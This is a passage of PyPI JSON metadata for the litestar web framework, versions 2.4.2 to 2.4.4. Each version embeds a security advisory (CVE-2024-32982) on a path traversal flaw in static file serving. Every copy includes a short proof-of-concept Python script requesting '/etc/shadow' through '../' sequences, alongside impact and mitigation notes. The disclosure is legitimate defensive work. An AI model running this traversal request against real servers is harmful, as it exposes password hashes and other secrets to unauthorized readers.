'3.9'","msgspec>=0.18.2","multidict>=6.0.2","polyfactory>=2.6.3","pyyaml","rich-click","rich>=13.0.0","typing-extensions","annotated-types; extra == 'annotated-types'","attrs; extra == 'attrs'","brotli; extra == 'brotli'","jsbeautifier; extra == 'cli'","uvicorn[standard]; extra == 'cli'","uvloop>=0.18.0; sys_platform != 'win32' and extra == 'cli'","cryptography; extra == 'cryptography'","litestar[annotated-types,attrs,brotli,cli,cryptography,jinja,jwt,mako,minijinja,opentelemetry,piccolo,picologging,prometheus,pydantic,redis,sqlalchemy,standard,structlog]; extra == 'full'","jinja2>=3.1.2; extra == 'jinja'","cryptography; extra == 'jwt'","python-jose; extra == 'jwt'","mako>=1.2.4; extra == 'mako'","minijinja>=1.0.0; extra == 'minijinja'","opentelemetry-instrumentation-asgi; extra == 'opentelemetry'","piccolo; extra == 'piccolo'","picologging; extra == 'picologging'","prometheus-client; extra == 'prometheus'","email-validator; extra == 'pydantic'","pydantic; extra == 'pydantic'","pydantic-extra-types; extra == 'pydantic'","redis[hiredis]>=4.4.4; extra == 'redis'","advanced-alchemy<1.0.0,>=0.2.2; extra == 'sqlalchemy'","fast-query-parsers>=1.0.2; extra == 'standard'","jinja2; extra == 'standard'","jsbeautifier; extra == 'standard'","uvicorn[standard]; extra == 'standard'","uvloop>=0.18.0; sys_platform != 'win32' and extra == 'standard'","structlog; extra == 'structlog'"],"requires_python":"<4.0,>=3.8","summary":"Litestar - A production-ready, highly performant, extensible ASGI API Framework","version":"2.4.2","yanked":false,"yanked_reason":null},"last_serial":25130260,"urls":[{"comment_text":"","digests":{"blake2b_256":"c0219972d40669c280dcc2dd72a5eeda89bf65fc7b07ec903a7c2f0467190706","md5":"c9b2b23829bb320369e14d9cfe021e4f","sha256":"562ef5075297694a428e5c162f8ec4073676ef3a4dd82279f85ede7cd88aa5b4"},"downloads":-1,"filename":"litestar-2.4.2-py3-none-any.whl","has_sig":false,"md5_digest":"c9b2b23829bb320369e14d9cfe021e4f","packagetype":"bdist_wheel","python_version":"py3","requires_python":"<4.0,>=3.8","size":485160,"upload_time":"2023-12-02T12:11:25","upload_time_iso_8601":"2023-12-02T12:11:25.115535Z","url":"https://files.pythonhosted.org/packages/c0/21/9972d40669c280dcc2dd72a5eeda89bf65fc7b07ec903a7c2f0467190706/litestar-2.4.2-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"938bab6da5dcd655c8e02c9949abb7cb4d9492a8ecb96438de376d83e81a8405","md5":"6b5f652203346538a63a12a6958de390","sha256":"a630ebe6575429d06b8af87dd20f2c27e91f14bcb73b6a9e5dd963e517b4891e"},"downloads":-1,"filename":"litestar-2.4.2.tar.gz","has_sig":false,"md5_digest":"6b5f652203346538a63a12a6958de390","packagetype":"sdist","python_version":"source","requires_python":"<4.0,>=3.8","size":624483,"upload_time":"2023-12-02T12:11:27","upload_time_iso_8601":"2023-12-02T12:11:27.515945Z","url":"https://files.pythonhosted.org/packages/93/8b/ab6da5dcd655c8e02c9949abb7cb4d9492a8ecb96438de376d83e81a8405/litestar-2.4.2.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2024-32982"],"details":"# Summary\n**Local File Inclusion via Path Traversal in LiteStar Static File Serving**\n\nA Local File Inclusion (LFI) vulnerability has been discovered in the static file serving component of [LiteStar](https://github.com/litestar-org/litestar). This vulnerability allows attackers to exploit path traversal flaws, enabling unauthorized access to sensitive files outside the designated directories. Such access can lead to the disclosure of sensitive information or potentially compromise the server.\n\n## Details\nThe vulnerability is located in the file path handling mechanism within the static content serving function, specifically at [line 70 in `litestar/static_files/base.py`](https://github.com/litestar-org/litestar/blob/main/litestar/static_files/base.py#L70).\n\nThe function fails to properly validate the destination file path derived from user input, thereby permitting directory traversal. The critical code segment is as follows:\n\n```python\ncommonpath([str(directory), file_info[\"name\"], joined_path])\n```\n\nGiven the variables:\n```python\ndirectory = PosixPath('/Users/brian/sandbox/test_vuln/static')\nfile_info[\"name\"] = '/Users/brian/sandbox/test_vuln/static/../requirements.txt'\njoined_path = PosixPath('/Users/brian/sandbox/test_vuln/static/../requirements.txt')\n```\n\nThe function outputs '/Users/brian/sandbox/test_vuln/static', incorrectly assuming it is confined to the static directory. This incorrect validation facilitates directory traversal, exposing the system to potential unauthorized access and manipulation.\n\n\n## Proof of Concept (PoC)\nTo reproduce this vulnerability, follow these steps:\n\n1. **Set up the environment:**\n   - Install with pip the `uvicorn` and `litestar` packages.\n   - Create a `static` folder in the root directory of your project and place any file (e.g., an image) in it for testing.\n   - Ensure the static file serving is enabled, which is typically the default configuration.\n\n2. **Preparation of the testing environment:**\n   - If using Ubuntu or a similar system, you can use `/etc/shadow` which contains sensitive password information. If not, create a dummy sensitive file outside the static directory for testing.\n   - Create a `main.py` file with the following content to configure and run the LiteStar server:\n\n    ```python\n    from pathlib import Path\n    from litestar import Litestar\n    from litestar.static_files import create_static_files_router\n    import uvicorn\n\n    app = Litestar(\n        route_handlers=[\n            create_static_files_router(path=\"/static\", directories=[\"static\"]),\n        ],\n    )\n\n    if __name__ == \"__main__\":\n        uvicorn.run(\"main:app\", host=\"0.0.0.0\", port=8000)\n    ```\n\n   - Run this script with the command `python3 main.py` to start the server.\n\n3. **Exploit:**\n   - Prepare an exploit script named `exploit.py` with the following Python code to perform the HTTP request without client-side sanitization:\n\n    ```python\n    import http.client\n\n    def send_request(host, port, path):\n        connection = http.client.HTTPConnection(host, port)\n        connection.request(\"GET\", path)\n        response = connection.getresponse()\n        print(f\"Status: {response.status}\")\n        print(f\"Headers: {response.getheaders()}\")\n        data = response.read()\n        print(f\"Body: {data.decode('utf-8')}\")\n        connection.close()\n\n    send_request(\"localhost\", 8000, \"/static/../../../../../../etc/shadow\")\n    ```\n\n   - Execute this script using `python3 exploit.py`. This script uses direct HTTP connections to bypass client-side path sanitization present in tools like curl or web browsers.\n\n4. **Observe:**\n   - The server should respond with the contents of the `/etc/shadow` file, thereby confirming the path traversal vulnerability.\n   - The output will display the status, headers, and body of the response, which should contain the contents of the sensitive file.\n\n\n## Impact\n\nThis Local File Inclusion vulnerability critically affects all instances of [LiteStar](https://github.com/litestar-org/litestar) where the server has been configured to serve static files. By exploiting this vulnerability, unauthorized attackers can gain read access to any file that the server process has permission to access. Here are the specific impacts:\n\n1. **Exposure of Sensitive Information:**\n   - The ability to traverse the file system can lead to the exposure of highly sensitive information. This includes system configuration files, application logs, or scripts containing credentials or cryptographic keys. Such information can provide attackers with deeper insights into the system architecture or facilitate further attacks.\n\n2. **Potential for System Compromise:**\n   - If sensitive system or application configuration files are exposed, attackers might be able to use this information to manipulate system behavior or escalate their privileges. For instance, accessing a `.env` file might reveal environment variables used for application configurations that include database passwords or API keys.\n\n3. **Credential Leakage:**\n   - Access to files such as `/etc/passwd` or `/etc/shadow` (on Unix-like systems) could expose user credentials, which might be leveraged to perform further attacks, such as brute force attacks on user accounts or using stolen credentials to access other systems where the same credentials are reused.\n\n4. **Regulatory and Compliance Violations:**\n   - Unauthorized access to personally identifiable information (PII), payment data, or health records could result in breaches of data protection regulations such as GDPR, HIPAA, or PCI DSS. This could not only damage the reputation of the organization but also lead to heavy fines and legal action.\n\n5. **Loss of Trust and Reputation Damage:**\n   - Security incidents, particularly those involving the loss of sensitive data, can significantly damage an organization's reputation. Customers and partners may lose trust, which can impact the business both immediately and in the long term.\n\n6. **Potential for Further Exploitation:**\n   - The initial read access gained through this vulnerability might be used as a stepping stone for more severe attacks. For example, if application source code is accessed, it could be analyzed for further vulnerabilities that might lead to direct exploitation, such as remote code execution.\n\n\n\nHere's the revised Mitigation Suggestion section for your vulnerability report, focusing on items 1 and 2, and including a reference to a similar implementation in another project:\n\n\n## Mitigation Suggestion\n\nTo effectively address the Local File Inclusion vulnerability via path traversal identified in the [LiteStar](https://github.com/litestar-org/litestar) application, it is essential to implement robust input validation and sanitization mechanisms. Below are specific strategies focused on managing user inputs and ensuring secure file path handling:\n\n1. **Input Validation and Sanitization:**\n   - Implement rigorous validation of all user-supplied input, particularly file path inputs. This should include sanitizing the input to remove or neutralize potentially harmful characters and sequences such as `../` which are used in path traversal attacks.\n   - Use regular expressions to validate file paths against a strict pattern that only matches expected and safe input.\n\n2. **Path Normalization:**\n   - Normalize file paths before using them in file operations. Functions such as `os.path.normpath()` in Python can be used to normalize paths. This method resolves redundant separators and up-level references (`../`) to prevent directory traversal.\n   - As a reference, consider the approach taken by the Starlette framework in their static file serving feature, where path validation is performed to ensure the requested path remains within the intended directory. For example, see how Starlette handles this with a security check:\n     ```python\n     if os.path.commonpath([full_path, directory]) != directory:\n         # Don't allow misbehaving clients to break out of the static files\n         # directory.\n         continue\n     ```\n     This snippet from [Starlette's implementation](https://github.com/encode/starlette/blob/master/starlette/staticfiles.py#L166) ensures that the constructed file path does not traverse out of the specified directory.\n\n\n## Comments\n**Naming Convention:**\n- From versions 0.X.X through 1.X.X, the package was released under the name \"starlite.\"\n- Starting with version 2.0.0 and for all subsequent versions, the package has been rebranded and released under the name \"litestar.\"\n\n**Feature Additions and Changes:**\n- Static Files Support: Introduced in version 0.6.0, adding the capability to serve static files directly from the package.\n- Path Validation Update: In version 1.37.0, Starlite modified its approach to validating paths within the static directory. Prior to this version, path validation was managed using the Starlette framework.","fixed_in":["2.8.3","2.7.2","2.6.4"],"id":"GHSA-83pv-qr33-2vcf","link":"https://osv.dev/vulnerability/GHSA-83pv-qr33-2vcf","source":"osv","summary":null,"withdrawn":null}]},"2.4.3":{"info":{"author":"","author_email":"Cody Fincher <cody.fincher@gmail.com>, Jacob Coffee <jacob@z7x.org>, Janek Nouvertné <provinzkraut@posteo.de>, Na'aman Hirschfeld <nhirschfeld@gmail.com>, Peter Schutt <peter.github@proton.me>","bugtrack_url":null,"classifiers":["Development Status :: 5 - Production/Stable","Environment :: Web Environment","Intended Audience :: Developers","Intended Audience :: Information Technology","Intended Audience :: System Administrators","License :: OSI Approved :: MIT License","Natural Language :: English","Operating System :: OS Independent","Programming Language :: Python","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9","Topic :: Internet","Topic :: Internet :: WWW/HTTP","Topic :: Internet :: WWW/HTTP :: HTTP Servers","Topic :: Software Development","Topic :: Software Development :: Libraries","Topic :: Software Development :: Libraries :: Application Frameworks","Topic :: Software Development :: Libraries :: Python Modules","Typing :: Typed"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"api,asgi,litestar,rest,starlite","license":"MIT","maintainer":"","maintainer_email":"Cody Fincher <cody.fincher@gmail.com>, Jacob Coffee <jacob@z7x.org>, Janek Nouvertné <provinzkraut@posteo.de>, Peter Schutt <peter.github@proton.me>","name":"litestar","package_url":"https://pypi.org/project/litestar/","platform":null,"project_url":"https://pypi.org/project/litestar/","project_urls":{"Blog":"https://blog.litestar.dev","Changelog":"https://github.com/litestar-org/litestar/releases/","Discord":"https://discord.gg/litestar-919193495116337154","Documentation":"https://docs.litestar.dev/","Homepage":"https://litestar.dev/","Issue Tracker":"https://github.com/litestar-org/litestar/issues?q=is%3Aissue+is%3Aopen+sort%3Aupdated-desc","Reddit":"https://www.reddit.com/r/LitestarAPI","Repository":"https://github.com/litestar-org/litestar","Twitter":"https://twitter.com/LitestarAPI"},"provides_extra":null,"release_url":"https://pypi.org/project/litestar/2.4.3/","requires_dist":["anyio>=3","click","httpx>=0.22","importlib-metadata; python_version < '3.10'","importlib-resources>=5.12.0; python_version < '3.9'","msgspec>=0.18.2","multidict>=6.0.2","polyfactory>=2.6.3","pyyaml","rich-click","rich>=13.0.0","typing-extensions","annotated-types; extra == 'annotated-types'","attrs; extra == 'attrs'","brotli; extra == 'brotli'","jsbeautifier; extra == 'cli'","uvicorn[standard]; extra == 'cli'","uvloop>=0.18.0; sys_platform != 'win32' and extra == 'cli'","cryptography; extra == 'cryptography'","litestar[annotated-types,attrs,brotli,cli,cryptography,jinja,jwt,mako,minijinja,opentelemetry,piccolo,picologging,prometheus,pydantic,redis,sqlalchemy,standard,structlog]; extra == 'full'","jinja2>=3.1.2; extra == 'jinja'","cryptography; extra == 'jwt'","python-jose; extra == 'jwt'","mako>=1.2.4; extra == 'mako'","minijinja>=1.0.0; extra == 'minijinja'","opentelemetry-instrumentation-asgi; extra == 'opentelemetry'","piccolo; extra == 'piccolo'","picologging; extra == 'picologging'","prometheus-client; extra == 'prometheus'","email-validator; extra == 'pydantic'","pydantic; extra == 'pydantic'","pydantic-extra-types; extra == 'pydantic'","redis[hiredis]>=4.4.4; extra == 'redis'","advanced-alchemy<1.0.0,>=0.2.2; extra == 'sqlalchemy'","fast-query-parsers>=1.0.2; extra == 'standard'","jinja2; extra == 'standard'","jsbeautifier; extra == 'standard'","uvicorn[standard]; extra == 'standard'","uvloop>=0.18.0; sys_platform != 'win32' and extra == 'standard'","structlog; extra == 'structlog'"],"requires_python":"<4.0,>=3.8","summary":"Litestar - A production-ready, highly performant, extensible ASGI API Framework","version":"2.4.3","yanked":false,"yanked_reason":null},"last_serial":25130260,"urls":[{"comment_text":"","digests":{"blake2b_256":"82bf47884245b18437da13e694d6666b5c666e25259b51cd919a16513cb6c5d6","md5":"4d459528ba89196a2013f14b2052b105","sha256":"90f0275c77e560a20adb6e07c6759478293be9545247c009c3da1f967ca4d118"},"downloads":-1,"filename":"litestar-2.4.3-py3-none-any.whl","has_sig":false,"md5_digest":"4d459528ba89196a2013f14b2052b105","packagetype":"bdist_wheel","python_version":"py3","requires_python":"<4.0,>=3.8","size":487641,"upload_time":"2023-12-07T17:13:46","upload_time_iso_8601":"2023-12-07T17:13:46.513404Z","url":"https://files.pythonhosted.org/packages/82/bf/47884245b18437da13e694d6666b5c666e25259b51cd919a16513cb6c5d6/litestar-2.4.3-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"54f26e3ae4c23e0d912b78de441d1cfb9b5f7869b1741f245b17550dd0eafa4f","md5":"4d801247042c2e1822d482fb8720d710","sha256":"11cad142432636384e6fb125a78c4fc80cf5e404c3b698033c0fae2413534944"},"downloads":-1,"filename":"litestar-2.4.3.tar.gz","has_sig":false,"md5_digest":"4d801247042c2e1822d482fb8720d710","packagetype":"sdist","python_version":"source","requires_python":"<4.0,>=3.8","size":626265,"upload_time":"2023-12-07T17:13:49","upload_time_iso_8601":"2023-12-07T17:13:49.104472Z","url":"https://files.pythonhosted.org/packages/54/f2/6e3ae4c23e0d912b78de441d1cfb9b5f7869b1741f245b17550dd0eafa4f/litestar-2.4.3.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2024-32982"],"details":"# Summary\n**Local File Inclusion via Path Traversal in LiteStar Static File Serving**\n\nA Local File Inclusion (LFI) vulnerability has been discovered in the static file serving component of [LiteStar](https://github.com/litestar-org/litestar). This vulnerability allows attackers to exploit path traversal flaws, enabling unauthorized access to sensitive files outside the designated directories. Such access can lead to the disclosure of sensitive information or potentially compromise the server.\n\n## Details\nThe vulnerability is located in the file path handling mechanism within the static content serving function, specifically at [line 70 in `litestar/static_files/base.py`](https://github.com/litestar-org/litestar/blob/main/litestar/static_files/base.py#L70).\n\nThe function fails to properly validate the destination file path derived from user input, thereby permitting directory traversal. The critical code segment is as follows:\n\n```python\ncommonpath([str(directory), file_info[\"name\"], joined_path])\n```\n\nGiven the variables:\n```python\ndirectory = PosixPath('/Users/brian/sandbox/test_vuln/static')\nfile_info[\"name\"] = '/Users/brian/sandbox/test_vuln/static/../requirements.txt'\njoined_path = PosixPath('/Users/brian/sandbox/test_vuln/static/../requirements.txt')\n```\n\nThe function outputs '/Users/brian/sandbox/test_vuln/static', incorrectly assuming it is confined to the static directory. This incorrect validation facilitates directory traversal, exposing the system to potential unauthorized access and manipulation.\n\n\n## Proof of Concept (PoC)\nTo reproduce this vulnerability, follow these steps:\n\n1. **Set up the environment:**\n   - Install with pip the `uvicorn` and `litestar` packages.\n   - Create a `static` folder in the root directory of your project and place any file (e.g., an image) in it for testing.\n   - Ensure the static file serving is enabled, which is typically the default configuration.\n\n2. **Preparation of the testing environment:**\n   - If using Ubuntu or a similar system, you can use `/etc/shadow` which contains sensitive password information. If not, create a dummy sensitive file outside the static directory for testing.\n   - Create a `main.py` file with the following content to configure and run the LiteStar server:\n\n    ```python\n    from pathlib import Path\n    from litestar import Litestar\n    from litestar.static_files import create_static_files_router\n    import uvicorn\n\n    app = Litestar(\n        route_handlers=[\n            create_static_files_router(path=\"/static\", directories=[\"static\"]),\n        ],\n    )\n\n    if __name__ == \"__main__\":\n        uvicorn.run(\"main:app\", host=\"0.0.0.0\", port=8000)\n    ```\n\n   - Run this script with the command `python3 main.py` to start the server.\n\n3. **Exploit:**\n   - Prepare an exploit script named `exploit.py` with the following Python code to perform the HTTP request without client-side sanitization:\n\n    ```python\n    import http.client\n\n    def send_request(host, port, path):\n        connection = http.client.HTTPConnection(host, port)\n        connection.request(\"GET\", path)\n        response = connection.getresponse()\n        print(f\"Status: {response.status}\")\n        print(f\"Headers: {response.getheaders()}\")\n        data = response.read()\n        print(f\"Body: {data.decode('utf-8')}\")\n        connection.close()\n\n    send_request(\"localhost\", 8000, \"/static/../../../../../../etc/shadow\")\n    ```\n\n   - Execute this script using `python3 exploit.py`. This script uses direct HTTP connections to bypass client-side path sanitization present in tools like curl or web browsers.\n\n4. **Observe:**\n   - The server should respond with the contents of the `/etc/shadow` file, thereby confirming the path traversal vulnerability.\n   - The output will display the status, headers, and body of the response, which should contain the contents of the sensitive file.\n\n\n## Impact\n\nThis Local File Inclusion vulnerability critically affects all instances of [LiteStar](https://github.com/litestar-org/litestar) where the server has been configured to serve static files. By exploiting this vulnerability, unauthorized attackers can gain read access to any file that the server process has permission to access. Here are the specific impacts:\n\n1. **Exposure of Sensitive Information:**\n   - The ability to traverse the file system can lead to the exposure of highly sensitive information. This includes system configuration files, application logs, or scripts containing credentials or cryptographic keys. Such information can provide attackers with deeper insights into the system architecture or facilitate further attacks.\n\n2. **Potential for System Compromise:**\n   - If sensitive system or application configuration files are exposed, attackers might be able to use this information to manipulate system behavior or escalate their privileges. For instance, accessing a `.env` file might reveal environment variables used for application configurations that include database passwords or API keys.\n\n3. **Credential Leakage:**\n   - Access to files such as `/etc/passwd` or `/etc/shadow` (on Unix-like systems) could expose user credentials, which might be leveraged to perform further attacks, such as brute force attacks on user accounts or using stolen credentials to access other systems where the same credentials are reused.\n\n4. **Regulatory and Compliance Violations:**\n   - Unauthorized access to personally identifiable information (PII), payment data, or health records could result in breaches of data protection regulations such as GDPR, HIPAA, or PCI DSS. This could not only damage the reputation of the organization but also lead to heavy fines and legal action.\n\n5. **Loss of Trust and Reputation Damage:**\n   - Security incidents, particularly those involving the loss of sensitive data, can significantly damage an organization's reputation. Customers and partners may lose trust, which can impact the business both immediately and in the long term.\n\n6. **Potential for Further Exploitation:**\n   - The initial read access gained through this vulnerability might be used as a stepping stone for more severe attacks. For example, if application source code is accessed, it could be analyzed for further vulnerabilities that might lead to direct exploitation, such as remote code execution.\n\n\n\nHere's the revised Mitigation Suggestion section for your vulnerability report, focusing on items 1 and 2, and including a reference to a similar implementation in another project:\n\n\n## Mitigation Suggestion\n\nTo effectively address the Local File Inclusion vulnerability via path traversal identified in the [LiteStar](https://github.com/litestar-org/litestar) application, it is essential to implement robust input validation and sanitization mechanisms. Below are specific strategies focused on managing user inputs and ensuring secure file path handling:\n\n1. **Input Validation and Sanitization:**\n   - Implement rigorous validation of all user-supplied input, particularly file path inputs. This should include sanitizing the input to remove or neutralize potentially harmful characters and sequences such as `../` which are used in path traversal attacks.\n   - Use regular expressions to validate file paths against a strict pattern that only matches expected and safe input.\n\n2. **Path Normalization:**\n   - Normalize file paths before using them in file operations. Functions such as `os.path.normpath()` in Python can be used to normalize paths. This method resolves redundant separators and up-level references (`../`) to prevent directory traversal.\n   - As a reference, consider the approach taken by the Starlette framework in their static file serving feature, where path validation is performed to ensure the requested path remains within the intended directory. For example, see how Starlette handles this with a security check:\n     ```python\n     if os.path.commonpath([full_path, directory]) != directory:\n         # Don't allow misbehaving clients to break out of the static files\n         # directory.\n         continue\n     ```\n     This snippet from [Starlette's implementation](https://github.com/encode/starlette/blob/master/starlette/staticfiles.py#L166) ensures that the constructed file path does not traverse out of the specified directory.\n\n\n## Comments\n**Naming Convention:**\n- From versions 0.X.X through 1.X.X, the package was released under the name \"starlite.\"\n- Starting with version 2.0.0 and for all subsequent versions, the package has been rebranded and released under the name \"litestar.\"\n\n**Feature Additions and Changes:**\n- Static Files Support: Introduced in version 0.6.0, adding the capability to serve static files directly from the package.\n- Path Validation Update: In version 1.37.0, Starlite modified its approach to validating paths within the static directory. Prior to this version, path validation was managed using the Starlette framework.","fixed_in":["2.8.3","2.7.2","2.6.4"],"id":"GHSA-83pv-qr33-2vcf","link":"https://osv.dev/vulnerability/GHSA-83pv-qr33-2vcf","source":"osv","summary":null,"withdrawn":null}]},"2.4.4":{"info":{"author":"","author_email":"Cody Fincher <cody.fincher@gmail.com>, Jacob Coffee <jacob@z7x.org>, Janek Nouvertné <provinzkraut@posteo.de>, Na'aman Hirschfeld <nhirschfeld@gmail.com>, Peter Schutt <peter.github@proton.me>","bugtrack_url":null,"classifiers":["Development Status :: 5 - Production/Stable","Environment :: Web Environment","Intended Audience :: Developers","Intended Audience :: Information Technology","Intended Audience :: System Administrators","License :: OSI Approved :: MIT License","Natural Language :: English","Operating System :: OS Independent","Programming Language :: Python","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9","Topic :: Internet","Topic :: Internet :: WWW/HTTP","Topic :: Internet :: WWW/HTTP :: HTTP Servers","Topic :: Software Development","Topic :: Software Development :: Libraries","Topic :: Software Development :: Libraries :: Application Frameworks","Topic :: Software Development :: Libraries :: Python Modules","Typing :: Typed"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"api,asgi,litestar,rest,starlite","license":"MIT","maintainer":"","maintainer_email":"Cody Fincher <cody.fincher@gmail.com>, Jacob Coffee <jacob@z7x.org>, Janek Nouvertné <provinzkraut@posteo.de>, Peter Schutt <peter.github@proton.me>","name":"litestar","package_url":"https://pypi.org/project/litestar/","platform":null,"project_url":"https://pypi.org/project/litestar/","project_urls":{"Blog":"https://blog.litestar.dev","Changelog":"https://github.com/litestar-org/litestar/releases/","Discord":"https://discord.gg/litestar-919193495116337154","Documentation":"https://docs.litestar.dev/","Homepage":"https://litestar.dev/","Issue Tracker":"https://github.com/litestar-org/litestar/issues?q=is%3Aissue+is%3Aopen+sort%3Aupdated-desc","Reddit":"https://www.reddit.com/r/LitestarAPI","Repository":"https://github.com/litestar-org/litestar","Twitter":"https://twitter.com/LitestarAPI"},"provides_extra":null,"release_url":"https://pypi.org/project/litestar/2.4.4/","requires_dist":["anyio>=3","click","httpx>=0.22","importlib-metadata; python_version < '3.10'","importlib-resources>=5.12.0; python_version < '3.9'","msgspec>=0.18.2","multidict>=6.0.2","polyfactory>=2.6.3","pyyaml","rich-click","rich>=13.0.0","typing-extensions","annotated-types; extra == 'annotated-types'","attrs; extra == 'attrs'","brotli; extra == 'brotli'","jsbeautifier; extra == 'cli'","uvicorn[standard]; extra == 'cli'","uvloop>=0.18.0; (sys_platform != 'win32') and extra == 'cli'","cryptography; extra == 'cryptography'","litestar[annotated-types,attrs,brotli,cli,cryptography,jinja,jwt,mako,minijinja,opentelemetry,piccolo,picologging,prometheus,pydantic,redis,sqlalchemy,standard,structlog]; extra == 'full'","jinja2>=3.1.2; extra == 'jinja'","cryptography; extra == 'jwt'","python-jose; extra == 'jwt'","mako>=1.2.4; extra == 'mako'","minijinja>=1.0.0; extra == 'minijinja'","opentelemetry-instrumentation-asgi; extra == 'opentelemetry'","piccolo; extra == 'piccolo'","picologging; extra == 'picologging'","prometheus-client; extra == 'prometheus'","email-validator; extra == 'pydantic'","pydantic; extra == 'pydantic'","pydantic-extra-types; extra == 'pydantic'","redis[hiredis]>=4.4.4; extra == 'redis'","advanced-alchemy<1.0.0,>=0.2.2; extra == 'sqlalchemy'","fast-query-parsers>=1.0.2; extra == 'standard'","jinja2; extra == 'standard'","jsbeautifier; extra == 'standard'","uvicorn[standard]; extra == 'standard'","uvloop>=0.18.0; (sys_platform != 'win32') and extra == 'standard'","structlog; extra == 'structlog'"],"requires_python":"<4.0,>=3.8","summary":"Litestar - A production-ready, highly performant, extensible ASGI API Framework","version":"2.4.4","yanked":false,"yanked_reason":null},"last_serial":25130260,"urls":[{"comment_text":"","digests":{"blake2b_256":"550435c3d8dfa8fd41e8ab25c1a3dfea274857af2e4aae40c14c592896c1fed7","md5":"52faf073cd2e356b7b2c463ff84bd07a","sha256":"e14c88f891f26e49acdddfbdad10a48944b1245b461d092d0aa8d0733be6f2a6"},"downloads":-1,"filename":"litestar-2.4.4-py3-none-any.whl","has_sig":false,"md5_digest":"52faf073cd2e356b7b2c463ff84bd07a","packagetype":"bdist_wheel","python_version":"py3","requires_python":"<4.0,>=3.8","size":491762,"upload_time":"2023-12-13T19:29:27","upload_time_iso_8601":"2023-12-13T19:29:27.898830Z","url":"https://files.pythonhosted.org/packages/55/04/35c3d8dfa8fd41e8ab25c1a3dfea274857af2e4aae40c14c592896c1fed7/litestar-2.4.4-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"2eac137cd861dad3eb42cd88eeb5bdc6d500406a51c4c88158614cd1ae274f58","md5":"1b2c56d66486c7c3ef166e196767f830","sha256":"5afffc087f639f111fdd1d0fd2b07575607606a24b7f2c88e60d08c03d83f663"},"downloads":-1,"filename":"litestar-2.4.4.tar.gz","has_sig":false,"md5_digest":"1b2c56d66486c7c3ef166e196767f830","packagetype":"sdist","python_version":"source","requires_python":"<4.0,>=3.8","size":630181,"upload_time":"2023-12-13T19:29:29","upload_time_iso_8601":"2023-12-13T19:29:29.987077Z","url":"https://files.pythonhosted.org/packages/2e/ac/137cd861dad3eb42cd88eeb5bdc6d500406a51c4c88158614cd1ae274f58/litestar-2.4.4.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2024-32982"],"details":"# Summary\n**Local File Inclusion via Path Traversal in LiteStar Static File Serving**\n\nA Local File Inclusion (LFI) vulnerability has been discovered in the static file serving component of [LiteStar](https://github.com/litestar-org/litestar). This vulnerability allows attackers to exploit path traversal flaws, enabling unauthorized access to sensitive files outside the designated directories. Such access can lead to the disclosure of sensitive information or potentially compromise the server.\n\n## Details\nThe vulnerability is located in the file path handling mechanism within the static content serving function, specifically at [line 70 in `litestar/static_files/base.py`](https://github.com/litestar-org/litestar/blob/main/litestar/static_files/base.py#L70).\n\nThe function fails to properly validate the destination file path derived from user input, thereby permitting directory traversal. The critical code segment is as follows:\n\n```python\ncommonpath([str(directory), file_info[\"name\"], joined_path])\n```\n\nGiven the variables:\n```python\ndirectory = PosixPath('/Users/brian/sandbox/test_vuln/static')\nfile_info[\"name\"] = '/Users/brian/sandbox/test_vuln/static/../requirements.txt'\njoined_path = PosixPath('/Users/brian/sandbox/test_vuln/static/../requirements.txt')\n```\n\nThe function outputs '/Users/brian/sandbox/test_vuln/static', incorrectly assuming it is confined to the static directory. This incorrect validation facilitates directory traversal, exposing the system to potential unauthorized access and manipulation.\n\n\n## Proof of Concept (PoC)\nTo reproduce this vulnerability, follow these steps:\n\n1. **Set up the environment:**\n   - Install with pip the `uvicorn` and `litestar` packages.\n   - Create a `static` folder in the root directory of your project and place any file (e.g., an image) in it for testing.\n   - Ensure the static file serving is enabled, which is typically the default configuration.\n\n2. **Preparation of the testing environment:**\n   - If using Ubuntu or a similar system, you can use `/etc/shadow` which contains sensitive password information. If not, create a dummy sensitive file outside the static directory for testing.\n   - Create a `main.py` file with the following content to configure and run the LiteStar server:\n\n    ```python\n    from pathlib import Path\n    from litestar import Litestar\n    from litestar.static_files import create_static_files_router\n    import uvicorn\n\n    app = Litestar(\n        route_handlers=[\n            create_static_files_router(path=\"/static\", directories=[\"static\"]),\n        ],\n    )\n\n    if __name__ == \"__main__\":\n        uvicorn.run(\"main:app\", host=\"0.0.0.0\", port=8000)\n    ```\n\n   - Run this script with the command `python3 main.py` to start the server.\n\n3. **Exploit:**\n   - Prepare an exploit script named `exploit.py` with the following Python code to perform the HTTP request without client-side sanitization:\n\n    ```python\n    import http.client\n\n    def send_request(host, port, path):\n        connection = http.client.HTTPConnection(host, port)\n        connection.request(\"GET\", path)\n        response = connection.getresponse()\n        print(f\"Status: {response.status}\")\n        print(f\"Headers: {response.getheaders()}\")\n        data = response.read()\n        print(f\"Body: {data.decode('utf-8')}\")\n        connection.close()\n\n    send_request(\"localhost\", 8000, \"/static/../../../../../../etc/shadow\")\n    ```\n\n   - Execute this script using `python3 exploit.py`. This script uses direct HTTP connections to bypass client-side path sanitization present in tools like curl or web browsers.\n\n4. **Observe:**\n   - The server should respond with the contents of the `/etc/shadow` file, thereby confirming the path traversal vulnerability.\n   - The output will display the status, headers, and body of the response, which should contain the contents of the sensitive file.\n\n\n## Impact\n\nThis Local File Inclusion vulnerability critically affects all instances of [LiteStar](https://github.com/litestar-org/litestar) where the server has been configured to serve static files. By exploiting this vulnerability, unauthorized attackers can gain read access to any file that the server process has permission to access. Here are the specific impacts:\n\n1. **Exposure of Sensitive Information:**\n   - The ability to traverse the file system can lead to the exposure of highly sensitive information. This includes system configuration files, application logs, or 